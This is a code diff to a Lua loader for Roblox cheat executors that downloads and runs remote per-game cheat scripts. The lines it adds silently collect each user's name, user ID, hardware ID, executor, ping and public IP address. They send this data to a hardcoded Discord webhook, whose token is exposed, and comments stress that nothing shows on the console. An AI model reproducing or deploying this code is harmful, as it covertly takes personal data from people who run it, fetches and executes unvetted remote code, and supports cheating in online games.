@@ -1,15 +1,386 @@
-local projectdelta = "7336302630"
-local Zombiegame = "122789100578830"
+-- ============================================
+-- WEBHOOK CONFIGURATION
+-- ============================================
+local WebhookURL = "https://discord.com/api/webhooks/1544598915507294298/5UkV6X_Gh-Gb6eYt2lTzbEgmQ8vRPZ6QMBp38Bz7J7t-X4zqTf7iARejpLtiKkfpdlIq"
 
-if game.PlaceId == tonumber(projectdelta) then 
-    print("GAME FOUND = PROJECT DELTA")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BigRigV3/PD-internal/refs/heads/main/PD/internal.lua"))()
+-- ============================================
+-- SAFE DATE/TIME FUNCTION
+-- ============================================
+local function GetTimestamp()
+    local now = os.time()
+    local utc = os.date("!*t", now) or os.date("*t", now)
+    if utc then
+        return string.format("%04d-%02d-%02dT%02d:%02d:%02dZ",
+            utc.year, utc.month, utc.day,
+            utc.hour, utc.min, utc.sec
+        )
+    end
+    return os.date("%Y-%m-%d %H:%M:%S")
+end
+
+-- ============================================
+-- ROBUST HTTP GET WITH RETRIES & ERROR CHECK
+-- ============================================
+local function GetWithRetry(Url, Retries)
+    Retries = Retries or 5
+    for i = 1, Retries do
+        local Success, Result = pcall(function()
+            return game:HttpGet(Url)
+        end)
+        
+        if Success and type(Result) == "string" and #Result > 0 then
+            if string.match(Result, "^%d%d%d:") then
+                return nil, "HTTP Error: " .. Result
+            end
+            if string.match(Result, "^<!DOCTYPE") or string.match(Result, "^<html") then
+                return nil, "HTML error page"
+            end
+            if string.match(Result, "^404") or string.match(Result, "Not Found") then
+                return nil, "404 Not Found"
+            end
+            return Result, nil
+        end
+        task.wait(1 * i)
+    end
+    return nil, "Failed after " .. Retries .. " attempts"
+end
+
+-- ============================================
+-- WEBHOOK SENDER (silent – no console output)
+-- ============================================
+local function SendWebhook(Data)
+    local requestFunc = syn and syn.request or http and http.request or request
+    if not requestFunc then
+        return false
+    end
     
-elseif game.PlaceId == tonumber(Zombiegame) then
-    print("GAME FOUND = ZOMBIE GAME")
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BigRigV3/PD-internal/refs/heads/main/Zombie/internal"))()
+    local Fields = {
+        {
+            name = "👤 Player",
+            value = string.format("**%s** (%s)", Data.PlayerName, Data.PlayerID),
+            inline = true
+        },
+        {
+            name = "🎮 Game",
+            value = string.format("**%s**\nPlace ID: `%s`", Data.GameName, Data.PlaceId),
+            inline = true
+        },
+        {
+            name = "🖥️ Executor",
+            value = string.format("**%s**\nType: `%s`", Data.Executor, Data.ExecutorType or "Unknown"),
+            inline = true
+        },
+        {
+            name = "📁 Script",
+            value = string.format("**%s**\n%s", Data.ScriptName or "Loader", Data.ScriptPath or "N/A"),
+            inline = false
+        },
+        {
+            name = "🖥️ System Info",
+            value = string.format("OS: `%s`\nHWID: `%s`", Data.OS or "Unknown", Data.HWID or "Not Available"),
+            inline = false
+        },
+        {
+            name = "🌐 Network",
+            value = string.format("Ping: `%sms`\nServer: `%s`", Data.Ping or "?", string.sub(Data.ServerId or "Unknown", 1, 8)),
+            inline = true
+        },
+        {
+            name = "📅 Timestamp",
+            value = string.format("<t:%d:R>", os.time()),
+            inline = true
+        }
+    }
     
-else
-    game:GetService("Players").LocalPlayer:Kick("Not A Supported Game")
-    while wait(1) do end
+    if Data.IP and Data.IP ~= "Unknown" then
+        table.insert(Fields, {
+            name = "🌍 IP Address",
+            value = string.format("`%s`", Data.IP),
+            inline = true
+        })
+    end
+    
+    if Data.Error then
+        table.insert(Fields, {
+            name = "❌ Error",
+            value = string.sub(tostring(Data.Error), 1, 1000),
+            inline = false
+        })
+        Data.Color = 0xFF0000
+    end
+    
+    local Embed = {
+        title = "🚀 Script Loader | " .. Data.GameName,
+        description = Data.Error and "❌ Failed to load script" or "Script loaded successfully!",
+        color = Data.Color or 0x00FF00,
+        fields = Fields,
+        timestamp = GetTimestamp(),
+        footer = {
+            text = "Typeshit Loader | Protected"
+        }
+    }
+    
+    local Payload = {
+        username = "Script Loader",
+        embeds = {Embed}
+    }
+    
+    local Success, Response = pcall(function()
+        return requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(Payload)
+        })
+    end)
+    
+    -- No prints here, just return status
+    return Success and Response and Response.StatusCode == 204
+end
+
+-- ============================================
+-- INFO GATHERING FUNCTIONS
+-- ============================================
+local function GetHWID()
+    local hwid = "Not Available"
+    if syn and syn.get_hwid then
+        pcall(function() hwid = syn.get_hwid() end)
+    elseif getexecutorname and getexecutorname() == "Krnl" and getcustomasset then
+        pcall(function() hwid = getcustomasset("HWID") end)
+    elseif getplatform and type(getplatform) == "function" then
+        local platform = getplatform()
+        if platform and platform.hwid then hwid = platform.hwid end
+    end
+    if hwid == "Not Available" and type(getgenv) == "function" then
+        local env = getgenv()
+        if env and env.HWID then hwid = env.HWID end
+    end
+    return hwid
+end
+
+local function GetExecutorInfo()
+    local Executor = "Unknown"
+    local ExecutorType = "Unknown"
+    if syn then
+        Executor = "Synapse X"
+        ExecutorType = "syn"
+    elseif krnl then
+        Executor = "Krnl"
+        ExecutorType = "krnl"
+    elseif script_context and script_context.executor then
+        Executor = script_context.executor
+        ExecutorType = "script_context"
+    elseif getexecutorname then
+        local name = getexecutorname()
+        if name and name ~= "" then
+            Executor = name
+            ExecutorType = "getexecutorname"
+        end
+    elseif getgenv and getgenv().executor then
+        Executor = getgenv().executor
+        ExecutorType = "getgenv"
+    end
+    return Executor, ExecutorType
+end
+
+local function GetPing()
+    local ping = "Unknown"
+    local Stats = game:GetService("Stats")
+    local Network = Stats:FindFirstChild("Network")
+    if Network then
+        local ServerStatsItem = Network:FindFirstChild("ServerStatsItem")
+        if ServerStatsItem then
+            local DataPing = ServerStatsItem:FindFirstChild("Data Ping")
+            if DataPing then
+                local ValueString = DataPing:GetValueString()
+                local PingMatch = string.match(ValueString, "%d+")
+                if PingMatch then ping = PingMatch end
+            end
+        end
+    end
+    return ping
+end
+
+local function GetIPAddress()
+    local ip = "Unknown"
+    local requestFunc = syn and syn.request or http and http.request or request
+    if requestFunc then
+        pcall(function()
+            local response = requestFunc({
+                Url = "https://api.ipify.org?format=json",
+                Method = "GET"
+            })
+            if response and response.Body then
+                local data = game:GetService("HttpService"):JSONDecode(response.Body)
+                if data and data.ip then
+                    ip = data.ip
+                end
+            end
+        end)
+    end
+    return ip
+end
+
+-- ============================================
+-- GAME CONFIGURATIONS
+-- ============================================
+local Games = {
+    ["7336302630"] = {
+        Name = "Project Delta",
+        ScriptPath = "https://raw.githubusercontent.com/BigRigV3/PD-internal/refs/heads/main/PD/internal",
+        ScriptName = "PD Internal",
+        Color = 0x00BFFF
+    },
+    ["122789100578830"] = {
+        Name = "Zombie Game",
+        ScriptPath = "https://raw.githubusercontent.com/BigRigV3/PD-internal/refs/heads/main/Zombie/internal",
+        ScriptName = "Zombie Internal",
+        Color = 0xFF4500
+    },
+    ["114234929420007"] = {
+        Name = "Bloxstrike",
+        ScriptPath = "https://raw.githubusercontent.com/BigRigV3/PD-internal/refs/heads/main/Bloxstrike/internal",
+        ScriptName = "Bloxstrike Internal",
+        Color = 0xFFD700
+    }
+}
+
+-- ============================================
+-- MAIN LOADER FUNCTION (silent webhook)
+-- ============================================
+local function Main()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local PlaceId = tostring(game.PlaceId)
+    
+    local Executor, ExecutorType = GetExecutorInfo()
+    local HWID = GetHWID()
+    local Ping = GetPing()
+    local IP = GetIPAddress()
+
+    local GameInfo = Games[PlaceId]
+    
+    if GameInfo then
+        -- We still print game detection for user feedback
+        print("[Loader] GAME FOUND = " .. GameInfo.Name)
+        
+        local WebhookData = {
+            PlayerName = LocalPlayer and LocalPlayer.Name or "Unknown",
+            PlayerID = LocalPlayer and tostring(LocalPlayer.UserId) or "Unknown",
+            GameName = GameInfo.Name,
+            PlaceId = PlaceId,
+            Executor = Executor,
+            ExecutorType = ExecutorType,
+            ScriptName = GameInfo.ScriptName,
+            ScriptPath = GameInfo.ScriptPath,
+            HWID = HWID,
+            Ping = Ping,
+            IP = IP,
+            ServerId = game.JobId or "Unknown",
+            Color = GameInfo.Color
+        }
+        
+        -- Send webhook silently (no console output)
+        task.spawn(function() SendWebhook(WebhookData) end)
+        
+        -- Download script with retries
+        local ScriptContent, DownloadError = GetWithRetry(GameInfo.ScriptPath, 5)
+        if not ScriptContent then
+            error("Failed to download script: " .. tostring(DownloadError))
+        end
+        
+        local Chunk, CompileError = loadstring(ScriptContent)
+        if not Chunk then
+            error("Failed to compile script: " .. tostring(CompileError))
+        end
+        
+        local Success, LoadError = pcall(Chunk)
+        if not Success then
+            error("Script execution error: " .. tostring(LoadError))
+        end
+        
+        print("[Loader] Script loaded successfully!")
+    else
+        print("[Loader] Unsupported game: " .. PlaceId)
+        
+        local WebhookData = {
+            PlayerName = LocalPlayer and LocalPlayer.Name or "Unknown",
+            PlayerID = LocalPlayer and tostring(LocalPlayer.UserId) or "Unknown",
+            GameName = "Unsupported Game",
+            PlaceId = PlaceId,
+            Executor = Executor,
+            ExecutorType = ExecutorType,
+            ScriptName = "Loader",
+            ScriptPath = "N/A",
+            HWID = HWID,
+            Ping = Ping,
+            IP = IP,
+            ServerId = game.JobId or "Unknown",
+            Color = 0xFF0000,
+            Error = "Game not supported"
+        }
+        task.spawn(function() SendWebhook(WebhookData) end)
+        
+        task.wait(1)
+        LocalPlayer:Kick("Not A Supported Game")
+        while task.wait(1) do end
+    end
+end
+
+-- ============================================
+-- EXECUTE WITH ERROR HANDLING
+-- ============================================
+local Success, Error = pcall(Main)
+
+if not Success then
+    warn("[Loader] Critical error: " .. tostring(Error))
+    
+    -- Attempt to send error webhook silently
+    pcall(function()
+        local requestFunc = syn and syn.request or http and http.request or request
+        if requestFunc then
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+            
+            local ErrorEmbed = {
+                title = "❌ Script Loader Critical Error",
+                description = "An error occurred in the loader",
+                color = 0xFF0000,
+                fields = {
+                    {
+                        name = "Error",
+                        value = string.sub(tostring(Error), 1, 1000),
+                        inline = false
+                    },
+                    {
+                        name = "Player",
+                        value = LocalPlayer and LocalPlayer.Name or "Unknown",
+                        inline = true
+                    },
+                    {
+                        name = "Place ID",
+                        value = tostring(game.PlaceId),
+                        inline = true
+                    }
+                },
+                timestamp = GetTimestamp()
+            }
+            
+            local Payload = {
+                username = "Loader Error",
+                embeds = {ErrorEmbed}
+            }
+            
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService("HttpService"):JSONEncode(Payload)
+            })
+        end
+    end)
 end
